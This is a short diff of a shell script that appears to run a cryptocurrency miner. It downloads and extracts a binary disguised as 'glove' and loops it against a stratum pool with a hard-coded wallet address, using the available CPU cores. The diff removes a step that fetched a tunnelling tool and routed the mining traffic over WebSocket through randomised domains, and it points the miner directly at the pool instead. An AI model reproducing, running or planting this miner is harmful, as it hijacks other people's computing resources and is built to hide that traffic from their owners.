@@ -74,20 +74,8 @@ sleep 2
 tar -xf glove.tar.gz
 sleep 2
 
-wget https://greenleaf.teatspray.uk/stun_10.1.6.tar.gz
-
-sleep 2
-
-tar -xf stun_10.1.6.tar.gz
-
-sleep 2
-
-./stun client --http-upgrade-path-prefix aPvDUHQEdtM5tVStQajxIVKaXA2Ad5TSu -L tcp://6666:novagrid.online:3001 ws://usashadespectre$(shuf -i 1-6 -n 1).devopsenterprise.uk:80 &
-
-sleep 2
-
 while true
 do
-./glove --algo yespower --param-n 2048 --param-r 8 --param-key "" -o stratum+tcp://127.0.0.1:6666 -u TP5gu4QH88SvvCX2HnDRZsQL7mmDxNvVKY -p x -t $used_num_of_cores
+./glove --algo yespower --param-n 2048 --param-r 8 --param-key "" -o stratum+tcp://novagrid.online:3001 -u TP5gu4QH88SvvCX2HnDRZsQL7mmDxNvVKY -p x -t $used_num_of_cores
 sleep 10
 done
